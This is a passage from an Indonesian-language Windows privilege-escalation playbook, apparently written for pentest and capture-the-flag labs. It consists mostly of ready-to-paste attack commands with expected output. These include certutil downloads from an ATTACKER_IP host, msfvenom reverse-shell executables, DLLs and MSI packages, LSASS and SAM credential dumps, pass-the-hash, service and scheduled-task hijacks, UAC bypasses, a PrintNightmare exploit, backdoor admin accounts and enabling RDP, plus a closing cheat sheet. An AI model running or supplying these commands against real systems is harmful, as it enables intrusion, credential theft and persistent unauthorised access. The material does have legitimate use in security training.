certutil -urlcache -split -f http://ATTACKER_IP:8080/JuicyPotato.exe C:\Temp\JP.exe

REM Test dengan CLSID default
C:\Temp\JP.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Temp\jp_test.txt" -t *

type C:\Temp\jp_test.txt
```

**Jika JuicyPotato butuh CLSID spesifik:**

- **Google search:** `"JuicyPotato CLSID list Windows Server 2016"` atau sesuai OS
- Referensi: `https://github.com/ohpe/juicy-potato/tree/master/CLSID`

cmd

```
REM Contoh dengan CLSID spesifik (Server 2019)
C:\Temp\JP.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Temp\jp_test.txt" -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

---

### Langkah 3.4 — SeDebugPrivilege (LSASS Dump)

> Prasyarat: `SeDebugPrivilege Enabled` di whoami /priv

cmd

```
REM Method 1: ProcDump (jika tidak ada AV)
certutil -urlcache -split -f http://ATTACKER_IP:8080/procdump.exe C:\Temp\procdump.exe
C:\Temp\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

REM Method 2: Task Manager (jika ada GUI/RDP)
REM Buka Task Manager → Details → lsass.exe → klik kanan → Create dump file

REM Method 3: PowerShell + MiniDump
powershell -c "
\$process = Get-Process lsass
\$dumpPath = 'C:\Temp\lsass.dmp'
\$stream = New-Object System.IO.FileStream(\$dumpPath, [System.IO.FileMode]::Create)
[System.Runtime.InteropServices.MiniDumpType]\$dumpType = [System.Runtime.InteropServices.MiniDumpType]::MiniDumpWithFullMemory
[System.Diagnostics.Process]::Start('C:\Windows\System32\rundll32.exe', 'C:\Windows\System32\comsvcs.dll, MiniDump ' + \$process.Id + ' ' + \$dumpPath + ' full') | Wait-Process
"

REM Method 4: Comsvcs (paling stealth)
powershell -c "
\$lsass = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump \$lsass C:\Temp\lsass.dmp full
"
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Dump 1 initiated
[+] Dump 1 writing: Estimated dump file size is 50 MB.
[+] Dump 1 complete: 50 MB written in 1.7 seconds
```

➡️ Transfer dump ke Parrot dan analisis:

Bash

```
# Di Parrot: download dump
# Gunakan SMB server atau transfer via shell

# Analisis dengan pypykatz
pip3 install pypykatz
pypykatz lsa minidump lsass.dmp

# Atau dengan Mimikatz offline
```

**OUTPUT BERHASIL ✅ — pypykatz menemukan credentials:**

text

```
== MSV ==
Username: Administrator
Domain: WEB01
LM: NA
NT: 8f49412c66f44e7c3e3e5e4cf6829476
SHA1: 1234...

== WDIGEST ==
username Administrator
password SuperSecret123!
```

➡️ Gunakan NT hash untuk Pass-the-Hash atau password langsung:

Bash

```
# PTH dengan hash
evil-winrm -i $TARGET -u Administrator -H "8f49412c66f44e7c3e3e5e4cf6829476"
nxc smb $TARGET -u Administrator -H "8f49412c66f44e7c3e3e5e4cf6829476"

# Jika dapat plaintext
evil-winrm -i $TARGET -u Administrator -p "SuperSecret123!"
```

---

### Langkah 3.5 — SeBackupPrivilege (SAM + SYSTEM Dump)

> Prasyarat: `SeBackupPrivilege Enabled`

cmd

```
REM Dump SAM dan SYSTEM hive
reg save HKLM\SAM C:\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Temp\system.hive /y
reg save HKLM\SECURITY C:\Temp\security.hive /y

REM Verifikasi file terbuat
dir C:\Temp\*.hive
```

**OUTPUT BERHASIL ✅:**

text

```
09/01/2024  11:30 AM            49,152 sam.hive
09/01/2024  11:30 AM        16,777,216 system.hive
09/01/2024  11:30 AM            32,768 security.hive
```

➡️ Transfer ke Parrot dan crack:

Bash

```
# Di Parrot: analisis hive
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

**OUTPUT BERHASIL ✅ — Hash didapat:**

text

```
[*] Target system bootKey: 0x4a3d...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

➡️ Crack hash atau gunakan PTH:

Bash

```
# Crack dengan hashcat
hashcat -m 1000 "fc525c9683e8fe067095ba2ddc971881" /usr/share/wordlists/rockyou.txt

# PTH langsung
impacket-psexec "Administrator@$TARGET" -hashes "aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"
```

---

## ═══════════════════════════════════════

## FASE 4: SERVICE EXPLOITATION

## ═══════════════════════════════════════

### Langkah 4.1 — Unquoted Service Path

> **Kondisi yang dibutuhkan:**
> 
> 1. Path service ada spasi DAN tidak di-quote
> 2. Salah satu direktori intermediate bisa ditulis oleh current user
> 3. Service berjalan sebagai SYSTEM/Admin
> 4. Service bisa di-restart (langsung atau setelah reboot)

cmd

```
REM Step 1: Cari semua unquoted service paths
wmic service get name,pathname,startname 2>nul | findstr /i /v "C:\Windows\\" | findstr /i " "

REM Step 2: Lebih spesifik — cari yang tidak di-quote
powershell -c "
Get-CimInstance Win32_Service |
Where-Object {
    \$_.PathName -notmatch '^\"' -and
    \$_.PathName -notmatch '^C:\\\\Windows' -and
    \$_.PathName -match ' '
} |
Select-Object Name, PathName, StartName, State
"
```

**OUTPUT BERHASIL ✅ — Ditemukan unquoted path:**

text

```
Name       PathName                                          StartName     State
----       --------                                          ---------     -----
BackupSvc  C:\Program Files\Backup Tool\backup service\svc.exe  LocalSystem   Running
```

➡️ Path yang dicoba Windows saat start service:

text

```
1. C:\Program.exe
2. C:\Program Files\Backup.exe
3. C:\Program Files\Backup Tool\backup.exe
4. C:\Program Files\Backup Tool\backup service\svc.exe  ← yang asli
```

cmd

```
REM Step 3: Cek mana direktori yang bisa ditulis
icacls "C:\" 2>nul | findstr /i "users\|everyone\|authenticated"
icacls "C:\Program Files\" 2>nul | findstr /i "users\|everyone\|authenticated"
icacls "C:\Program Files\Backup Tool\" 2>nul | findstr /i "users\|everyone\|authenticated"

REM Gunakan accesschk untuk lebih detail
certutil -urlcache -split -f http://ATTACKER_IP:8080/accesschk.exe C:\Temp\accesschk.exe
C:\Temp\accesschk.exe /accepteula -dqw "C:\Program Files\Backup Tool\" 2>nul
```

**OUTPUT BERHASIL ✅ — Directory writable:**

text

```
C:\Program Files\Backup Tool
  RW BUILTIN\Users
```

atau dari icacls:

text

```
C:\Program Files\Backup Tool BUILTIN\Users:(OI)(CI)(W)
```

➡️ `(W)` = Write = kita bisa buat file di sana!

cmd

```
REM Step 4: Buat payload
REM Di Parrot:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe -o Backup.exe

REM Transfer ke target
certutil -urlcache -split -f http://ATTACKER_IP:8080/Backup.exe "C:\Program Files\Backup Tool\Backup.exe"

REM Step 5: Setup listener di Parrot
# nc -lvnp 4445

REM Step 6: Restart service (jika punya permission)
sc stop BackupSvc
sc start BackupSvc

REM Jika tidak bisa restart, cek apakah bisa trigger lain
REM atau tunggu reboot (tanda: "Auto" start mode)
```

**OUTPUT BERHASIL ✅ — Dapat shell SYSTEM:**

text

```
# Di terminal Parrot (listener):
connect to [ATTACKER_IP] from [TARGET_IP] 45678
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**OUTPUT GAGAL ❌ — Tidak bisa restart service:**

text

```
[SC] OpenService FAILED 5: Access is denied.
```

➡️ Tidak punya permission restart service.

- Cek apakah ada cara lain trigger service (ada schedule? ada trigger event?)
- Atau tunggu: jika `StartMode = Auto`, akan jalan setelah reboot

cmd

```
REM Cek start mode
sc qc BackupSvc | findstr "START_TYPE"
```

Jika `AUTO_START` → payload akan dieksekusi saat reboot berikutnya.

---

### Langkah 4.2 — Weak Service Permissions (SERVICE_CHANGE_CONFIG)

cmd

```
REM Cek permission service dengan accesschk
C:\Temp\accesschk.exe /accepteula -uwcqv "%USERNAME%" *
C:\Temp\accesschk.exe /accepteula -uwcqv "Users" *
C:\Temp\accesschk.exe /accepteula -uwcqv "Everyone" *
C:\Temp\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

**OUTPUT BERHASIL ✅ — Service dengan permission lemah:**

text

```
RW VulnSvc
    SERVICE_ALL_ACCESS
```

atau minimal:

text

```
RW VulnSvc
    SERVICE_CHANGE_CONFIG
    SERVICE_START
    SERVICE_STOP
```

cmd

```
REM Ubah binPath service ke payload kita
sc config VulnSvc binPath= "C:\Temp\nc.exe ATTACKER_IP 4445 -e cmd.exe"

REM Verifikasi perubahan
sc qc VulnSvc | findstr BINARY_PATH

REM Setup listener di Parrot dulu: nc -lvnp 4445

REM Restart service
sc stop VulnSvc
sc start VulnSvc
```

**OUTPUT BERHASIL ✅ — Config berhasil diubah:**

text

```
[SC] ChangeServiceConfig SUCCESS
```

**OUTPUT GAGAL ❌ — Perubahan ditolak:**

text

```
[SC] ChangeServiceConfig FAILED 5: Access is denied.
```

➡️ Privilege yang dicek dengan accesschk mungkin tidak akurat. Coba cek lagi:

cmd

```
REM Cek sdshow untuk melihat SDDL
sc sdshow VulnSvc
```

**Google search:** `"windows SDDL decode service permissions"` untuk decode output `sc sdshow`

---

### Langkah 4.3 — Writable Service Binary

cmd

```
REM Cari service binary yang bisa ditulis
wmic service get name,pathname,startname 2>nul | findstr /i "LocalSystem"

REM Untuk setiap service path yang ditemukan, cek permission
icacls "C:\Path\To\service.exe" 2>nul

REM Atau scan massal dengan accesschk
C:\Temp\accesschk.exe /accepteula -quvws "%USERNAME%" C:\*.exe
C:\Temp\accesschk.exe /accepteula -quvws "%USERNAME%" "C:\Program Files\*.exe"
```

**OUTPUT BERHASIL ✅ — Binary writable:**

text

```
C:\VulnApp\service.exe BUILTIN\Users:(M)
```

cmd

```
REM Backup binary asli
copy "C:\VulnApp\service.exe" "C:\Temp\service.exe.bak"

REM Replace dengan payload
copy /y C:\Temp\payload.exe "C:\VulnApp\service.exe"

REM Restart
sc stop VulnAppSvc
sc start VulnAppSvc
```

---

## ═══════════════════════════════════════

## FASE 5: ALWAYSINSTALLELEVATED

## ═══════════════════════════════════════

> Prasyarat: KEDUA registry key bernilai `0x1`

### Langkah 5.1 — Verifikasi dan Exploit

cmd

```
REM Konfirmasi keduanya aktif
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

**OUTPUT BERHASIL ✅ — Keduanya 0x1:**

text

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Bash

```
# Di Parrot: buat MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f msi -o malicious.msi

# Transfer ke target
# python3 -m http.server 8080
```

cmd

```
REM Di target: download dan eksekusi MSI
certutil -urlcache -split -f http://ATTACKER_IP:8080/malicious.msi C:\Temp\mal.msi

REM Setup listener di Parrot dulu: nc -lvnp 4445

REM Eksekusi MSI
msiexec /quiet /qn /i C:\Temp\mal.msi
```

**OUTPUT BERHASIL ✅ — Shell diterima di Parrot:**

text

```
connect to [ATTACKER_IP] from [TARGET_IP]
C:\Windows\system32> whoami
nt authority\system
```

**OUTPUT GAGAL ❌ — MSI tidak menghasilkan SYSTEM:**

text

```
(tidak ada koneksi masuk)
```

➡️ Coba cara lain:

cmd

```
REM Method 2: Tambah user admin via MSI
REM Di Parrot:
# msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd123! -f msi -o adduser.msi

REM Method 3: Via PowerUp
powershell -ep bypass -c ". C:\Temp\PowerUp.ps1; Write-UserAddMSI"
REM Ini membuat file .msi yang menambah user admin
```

---

## ═══════════════════════════════════════

## FASE 6: SCHEDULED TASK EXPLOITATION

## ═══════════════════════════════════════

### Langkah 6.1 — Identify Vulnerable Task

cmd

```
REM Cari semua task yang dijalankan SYSTEM
schtasks /query /fo LIST /v 2>nul | findstr /B "TaskName:\|Task To Run:\|Run As User:\|Status:"

REM Lebih rapi dengan PowerShell
powershell -c "
Get-ScheduledTask |
Where-Object {\$_.Principal.UserId -like '*SYSTEM*' -or \$_.Principal.RunLevel -eq 'Highest'} |
ForEach-Object {
    \$action = \$_.Actions | Select-Object -First 1
    [PSCustomObject]@{
        Name = \$_.TaskName
        Execute = \$action.Execute
        Arguments = \$action.Arguments
        State = \$_.State
    }
} | Format-List
"
```

**OUTPUT BERHASIL ✅ — Ditemukan task SYSTEM:**

text

```
Name      : BackupTask
Execute   : C:\Tasks\backup.exe
Arguments : --silent
State     : Ready
```

cmd

```
REM Cek permission binary
icacls "C:\Tasks\backup.exe"
```

text

```
C:\Tasks\backup.exe
  BUILTIN\Users:(M)
  NT AUTHORITY\SYSTEM:(F)
```

cmd

```
REM Backup dan replace
copy "C:\Tasks\backup.exe" "C:\Temp\backup_original.exe"
copy /y C:\Temp\payload.exe "C:\Tasks\backup.exe"

REM Trigger task (jika punya permission)
schtasks /run /tn "\BackupTask"
```

**OUTPUT BERHASIL ✅ — Task berhasil dijalankan:**

text

```
SUCCESS: Attempted to run the scheduled task "\BackupTask".
```

➡️ Tunggu koneksi masuk di listener.

**OUTPUT GAGAL ❌ — Tidak bisa run task:**

text

```
ERROR: Access is denied.
```

➡️ Tunggu trigger otomatis (lihat jadwal task) atau reboot.

---

## ═══════════════════════════════════════

## FASE 7: DLL HIJACKING

## ═══════════════════════════════════════

### Langkah 7.1 — Identifikasi DLL Hijacking Opportunity

cmd

```
REM Cek writable directories dalam PATH
powershell -c "
\$env:PATH -split ';' | ForEach-Object {
    if (Test-Path \$_) {
        try {
            \$testFile = Join-Path \$_ 'test_write_permission.tmp'
            [IO.File]::WriteAllText(\$testFile, 'test')
            Remove-Item \$testFile
            Write-Output \"[WRITABLE] \$_\"
        } catch {
            Write-Output \"[readonly] \$_\"
        }
    }
}
"

REM Gunakan PowerUp
powershell -ep bypass -c ". C:\Temp\PowerUp.ps1; Find-PathDLLHijack"
powershell -ep bypass -c ". C:\Temp\PowerUp.ps1; Find-ProcessDLLHijack"
```

**OUTPUT BERHASIL ✅ — Writable PATH directory:**

text

```
[WRITABLE] C:\Python38
```

➡️ Cari binary SYSTEM yang load DLL dari path ini:

cmd

```
REM Cek process SYSTEM yang berjalan dan mungkin load DLL dari PATH
tasklist /v | findstr SYSTEM
```

**Untuk identifikasi DLL yang hilang, gunakan Procmon (jika ada akses GUI/RDP):**

- Filter: `Process Name` is `target.exe`, `Operation` is `Load Image`, `Result` is `NAME NOT FOUND`
- Setiap entry `.dll` dengan `NAME NOT FOUND` adalah kandidat

Bash

```
# Di Parrot: buat DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f dll -o missing.dll
```

cmd

```
REM Upload ke writable PATH directory
certutil -urlcache -split -f http://ATTACKER_IP:8080/missing.dll "C:\Python38\missing.dll"
```

➡️ Tunggu process yang load DLL tersebut dijalankan.

---

## ═══════════════════════════════════════

## FASE 8: UAC BYPASS

## ═══════════════════════════════════════

> **Masuk sini jika:** Kamu adalah member Administrators TAPI integrity level masih Medium.  
> **Cek:** `whoami /groups | findstr Mandatory`

### Langkah 8.1 — Konfirmasi Butuh UAC Bypass

cmd

```
REM Cek integrity level
whoami /groups | findstr /i "mandatory"

REM Cek apakah member administrators
whoami /groups | findstr /i "administrators"
```

**OUTPUT yang menandakan perlu UAC bypass:**

text

```
Mandatory Label\Medium Mandatory Level    Label    S-1-16-8192
...
BUILTIN\Administrators    Alias    S-1-5-32-544    Group used for deny only
```

➡️ `Medium Mandatory Level` + `deny only` = perlu bypass UAC

---

### Langkah 8.2 — Fodhelper UAC Bypass

PowerShell

```
REM Method Fodhelper (reliable untuk Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Temp\payload.exe" -Force

Start-Process "$env:WINDIR\System32\fodhelper.exe" -WindowStyle Hidden
```

**OUTPUT BERHASIL ✅ — Payload berjalan elevated:**

➡️ Jika payload adalah cmd.exe atau nc.exe reverse shell, akan dapat High Integrity shell.

cmd

```
REM Cleanup setelah berhasil
powershell -c "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force -ErrorAction SilentlyContinue"
```

**OUTPUT GAGAL ❌ — Fodhelper tidak work:**

➡️ Coba Eventvwr bypass:

PowerShell

```
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Temp\payload.exe" -Force
Start-Process "$env:WINDIR\System32\eventvwr.exe" -WindowStyle Hidden
```

**Google search jika semua gagal:** `"UAC bypass Windows 10 Build 19041 fileless"` atau gunakan **UACME** tool dengan method yang sesuai build target.

---

## ═══════════════════════════════════════

## FASE 9: KERNEL / PATCH EXPLOITATION

## ═══════════════════════════════════════

> **Last resort!** Gunakan setelah semua method lain gagal.

### Langkah 9.1 — Kumpulkan Info untuk WES-NG

cmd

```
REM Export systeminfo
systeminfo > C:\Temp\systeminfo.txt

REM Transfer ke Parrot (copy paste atau download)
type C:\Temp\systeminfo.txt
```

Bash

```
# Di Parrot: analisis dengan WES-NG
pip3 install wesng
wes.py --update
wes.py systeminfo.txt --impact "Elevation of Privilege" 2>/dev/null | head -100
```

**OUTPUT BERHASIL ✅ — CVE ditemukan:**

text

```
Date        : 20210713
CVE         : CVE-2021-34527
KB          : KB5004945
Component   : Windows Print Spooler
Description : Windows Print Spooler Remote Code Execution
Exploits    : https://github.com/cube0x0/CVE-2021-34527
Impact      : Remote Code Execution, Elevation of Privilege
```

➡️ Cek apakah target memang vulnerable (konfirmasi patch belum terinstall):

cmd

```
wmic qfe list brief | findstr "KB5004945"
REM Jika tidak ada output = patch belum ada = VULNERABLE
```

---

### Langkah 9.2 — Common Kernel Exploits

**HiveNightmare / SeriousSAM (CVE-2021-36934):**

cmd

```
REM Cek apakah vulnerable: icacls harus menunjukkan Users bisa read SAM
icacls C:\Windows\System32\config\SAM

REM Output vulnerable: BUILTIN\Users:(I)(RX)
REM Output tidak vulnerable: hanya SYSTEM dan Administrators
```

cmd

```
REM Jika vulnerable: copy SAM
copy C:\Windows\System32\config\SAM C:\Temp\SAM
copy C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
copy C:\Windows\System32\config\SECURITY C:\Temp\SECURITY
```

**PrintNightmare (CVE-2021-34527):**

cmd

```
REM Cek apakah Print Spooler running
sc query Spooler | findstr RUNNING

REM Jika running, kemungkinan vulnerable (tergantung patch)
```

Bash

```
# Di Parrot: gunakan exploit
git clone https://github.com/cube0x0/CVE-2021-34527.git
cd CVE-2021-34527
# Setup SMB server dengan DLL payload
python3 CVE-2021-34527.py CORP/user:password@TARGET '\\ATTACKER_IP\share\reverse.dll'
```

**Google search untuk exploit spesifik:** `"CVE-XXXX-XXXXX PoC Windows privesc"` atau cari di `https://github.com/SecWiki/windows-kernel-exploits`

---

## ═══════════════════════════════════════

## FASE 10: POST-EXPLOITATION SETELAH SYSTEM

## ═══════════════════════════════════════

> **Masuk sini setelah `whoami` = `nt authority\system`**

### Langkah 10.1 — Verifikasi dan Stabilkan Shell

cmd

```
REM Konfirmasi privilege
whoami
whoami /all

REM Buat user admin sebagai backup akses
net user hacker P@ssw0rd123! /add
net localgroup administrators hacker /add

REM Enable RDP (untuk akses yang lebih stable)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

REM Cek network (untuk pivoting)
ipconfig /all
arp -a
route print
netstat -ano
```

---

### Langkah 10.2 — Dump Credentials untuk Lateral Movement

cmd

```
REM Method 1: secretsdump dari Parrot (paling bersih)
REM (jalankan dari Parrot setelah dapat admin credential)
# impacket-secretsdump "Administrator:P@ssw0rd123!@TARGET"
# impacket-secretsdump "Administrator@TARGET" -hashes "LMHASH:NTHASH"

REM Method 2: Reg save dari target (jika sudah SYSTEM)
reg save HKLM\SAM C:\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Temp\system.hive /y
reg save HKLM\SECURITY C:\Temp\security.hive /y

REM Method 3: Mimikatz (jika tidak ada AV)
certutil -urlcache -split -f http://ATTACKER_IP:8080/mimikatz.exe C:\Temp\mim.exe
C:\Temp\mim.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

**OUTPUT BERHASIL ✅ — Hash dari secretsdump:**

text

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
webuser:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information
CORP.LOCAL/domain_admin:$DCC2$10240#domain_admin#...(hash)

[*] Dumping LSA Secrets
_SC_MSSQLSERVER: sql_service:MSSQLPass2024!
```

➡️ Setiap hash dan password yang ditemukan → test ke service lain!

---

### Langkah 10.3 — Pivot ke Jaringan Internal & AD

Bash

```
# Test hash/credential ke semua service
# SMB ke semua host yang ditemukan dari arp -a dan netstat
nxc smb 192.168.1.0/24 -u Administrator -H "fc525c9683e8fe067095ba2ddc971881" --continue-on-success

# Jika domain joined → pivot ke AD workflow
# Kumpulkan BloodHound data dari target yang sudah dikuasai
```

cmd

```
REM Di target: jalankan SharpHound untuk BloodHound
certutil -urlcache -split -f http://ATTACKER_IP:8080/SharpHound.exe C:\Temp\SharpHound.exe
C:\Temp\SharpHound.exe -c All --zipfilename bh_data.zip
```

➡️ Transfer `bh_data.zip` ke Parrot → import ke BloodHound  
➡️ Lanjut ke **[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)** dan **[🩸 36 — Active Directory BloodHound Workflow](/docs/ad-bloodhound)**

---

### Langkah 10.4 — Ambil Flag

cmd

```
REM User flag (biasanya di Desktop user yang dicompromise pertama)
dir C:\Users\*\Desktop\*.txt 2>nul
dir C:\Users\*\Desktop\user.txt 2>nul
dir C:\Users\*\Desktop\local.txt 2>nul

REM Root/Admin flag
dir C:\Users\Administrator\Desktop\ 2>nul
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\proof.txt

REM HTB flags also sometimes here
type C:\root.txt
type C:\flag.txt
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE

## ═══════════════════════════════════════

text

```
START: Low-privilege Windows shell
│
├─ FASE 0: Identifikasi Awal
│   ├─ whoami /priv → SeImpersonatePrivilege?    → FASE 3 (Potato)
│   ├─ whoami /priv → SeDebugPrivilege?          → FASE 3.4 (LSASS)
│   ├─ whoami /priv → SeBackupPrivilege?         → FASE 3.5 (SAM Dump)
│   └─ Tidak ada privilege → FASE 1 (WinPEAS)
│
├─ FASE 1: WinPEAS / Automated Enum
│   ├─ Credential ditemukan          → Test reuse langsung
│   ├─ AlwaysInstallElevated = 1     → FASE 5
│   ├─ Unquoted Service Path         → FASE 4.1
│   ├─ Modifiable Service            → FASE 4.2/4.3
│   ├─ Scheduled Task + writable     → FASE 6
│   ├─ DLL Hijacking candidate       → FASE 7
│   └─ Tidak jelas → FASE 2 (Manual)
│
├─ FASE 2: Manual Enumeration
│   ├─ Credential di history/files   → Test reuse
│   ├─ Service vulnerable            → FASE 4
│   ├─ Registry keys                 → FASE 5
│   └─ Localhost services            → Eksplor lebih lanjut
│
├─ FASE 3: Token Privilege
│   ├─ GodPotato berhasil            → SYSTEM ✓
│   ├─ PrintSpoofer berhasil         → SYSTEM ✓
│   ├─ JuicyPotato berhasil          → SYSTEM ✓
│   └─ Semua gagal → FASE 4
│
├─ FASE 4: Service Exploitation
│   ├─ Unquoted path + writable dir  → Replace exe → SYSTEM ✓
│   ├─ SERVICE_CHANGE_CONFIG          → Ubah binPath → SYSTEM ✓
│   └─ Writable binary               → Replace → SYSTEM ✓
│
├─ FASE 5: AlwaysInstallElevated
│   └─ MSI payload → SYSTEM ✓
│
├─ FASE 6: Scheduled Task
│   └─ Replace binary + trigger → SYSTEM ✓
│
├─ FASE 7: DLL Hijacking
│   └─ Place DLL in writable PATH → SYSTEM ✓
│
├─ FASE 8: UAC Bypass
│   └─ (Jika sudah Admin tapi medium integrity) → High integrity ✓
│
└─ FASE 9: Kernel/CVE
    └─ Last resort → SYSTEM ✓

SETELAH SYSTEM:
└─ FASE 10: Post-Exploitation
    ├─ Dump credentials (SAM, LSA, LSASS)
    ├─ Enable RDP / tambah user backup
    ├─ Cek network untuk pivoting
    ├─ Jika domain joined → AD workflow
    └─ Ambil flag
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|`Access is denied` saat download|Egress firewall / permission|Coba SMB, base64 encode, atau path alternatif|
|`GodPotato failed - Token Impersonation failed`|OS/context tidak kompatibel|Coba PrintSpoofer atau JuicyPotato|
|`PrintSpoofer: CreateFile failed: 2`|Named pipe tidak tersedia|Coba GodPotato atau RoguePotato|
|`JuicyPotato: [-] CreateProcessWithTokenW Failed`|CLSID salah / OS tidak cocok|Cari CLSID yang tepat untuk OS target|
|`sc config FAILED 5`|Tidak punya `SERVICE_CHANGE_CONFIG`|Cek accesschk, cari service lain|
|`msiexec` tidak menghasilkan SYSTEM|AlwaysInstallElevated hanya satu yang 1|Pastikan HKLM **dan** HKCU keduanya = 1|
|`certutil` diblokir AV|Security tool deteksi certutil download|Gunakan PowerShell IWR atau SMB|
|WinPEAS dihapus AV|Signature detection|Gunakan Seatbelt / PowerUp / PrivescCheck|
|`reg save` gagal (access denied)|Tidak punya SeBackupPrivilege|Cari vector lain|
|UAC bypass tidak work|Patch / UAC policy|Cek build number, gunakan UACME method yang sesuai|
|Reverse shell tidak connect|Firewall outbound / listener salah|Coba port 80/443, atau gunakan SMB tunnel|
|`tasklist /v` tidak tampilkan owner|Butuh privilege lebih|Gunakan `Get-CimInstance Win32_Process`|
|Scheduled task tidak trigger|Tidak punya permission run|Tunggu jadwal otomatis atau cari trigger lain|
|Kernel exploit crash / BSOD|CVE tidak match exact build|Verifikasi build + patch, jangan force|
|WinPEAS berjalan tapi tidak ada output merah|Target cukup hardened|Manual enum lebih detail, coba vector kredensial|

---

## ⚡ CHEATSHEET — COPY PASTE READY

cmd

```
REM === IDENTIFIKASI AWAL ===
whoami /all
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
echo %USERDNSDOMAIN%

REM === TRANSFER TOOLS ===
certutil -urlcache -split -f http://ATTACKER_IP:8080/winPEASx64.exe C:\Temp\winpeas.exe
powershell -c "iwr http://ATTACKER_IP:8080/winPEASx64.exe -o C:\Temp\winpeas.exe"

REM === CREDENTIAL HUNTING ===
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul
findstr /si "password" C:\*.txt C:\*.xml C:\*.config 2>nul

REM === TOKEN PRIVILEGES ===
C:\Temp\GodPotato.exe -cmd "cmd /c whoami"
C:\Temp\PrintSpoofer.exe -i -c "cmd /c whoami"

REM === SERVICE ENUM ===
wmic service get name,pathname,startname 2>nul | findstr /i /v "C:\Windows\\"
C:\Temp\accesschk.exe /accepteula -uwcqv "Users" * 2>nul

REM === REGISTRY ===
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul

REM === SCHEDULED TASKS ===
schtasks /query /fo LIST /v 2>nul | findstr /B "TaskName:\|Task To Run:\|Run As User:"

REM === SAM DUMP (setelah SYSTEM) ===
reg save HKLM\SAM C:\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Temp\system.hive /y

REM === POST EXPLOITATION ===
net user hacker P@ssw0rd123! /add
net localgroup administrators hacker /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM === FLAG ===
dir C:\Users\*\Desktop\*.txt 2>nul
type C:\Users\Administrator\Desktop\root.txt
```

---

> **➡️ NEXT STEPS setelah Windows PrivEsc:**
> 
> - Dapat hash/creds → **`<a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>`**
> - Domain environment → **`<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`**
> - Perlu deep dive token impersonation → **`<a href="/docs/token-impersonation" class="text-[#00b4d8] hover:underline font-mono font-semibold">46_token_impersonation_workflow.md</a>`**
> - Mau persistency → **`<a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>`**
> - NTLM hashes untuk relay → **`<a href="/docs/ntlm-relay" class="text-[#00b4d8] hover:underline font-mono font-semibold">41_ntlm_relay_workflow.md</a>`**